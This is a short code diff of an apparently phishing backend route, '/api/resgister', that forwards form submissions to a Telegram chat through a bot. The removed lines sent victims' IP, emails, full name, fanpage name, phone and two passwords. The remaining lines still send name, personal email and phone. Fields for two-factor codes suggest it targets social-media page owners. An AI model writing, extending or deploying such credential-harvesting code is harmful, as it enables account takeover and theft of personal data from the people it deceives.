@@ -30,14 +30,9 @@ app.post('/api/resgister', (req, res) => {
 
 if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     
-    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
-<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
-<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
-<strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
-<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
-<strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}`;
+    const message = `<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''}
+<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''} 
+<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
 
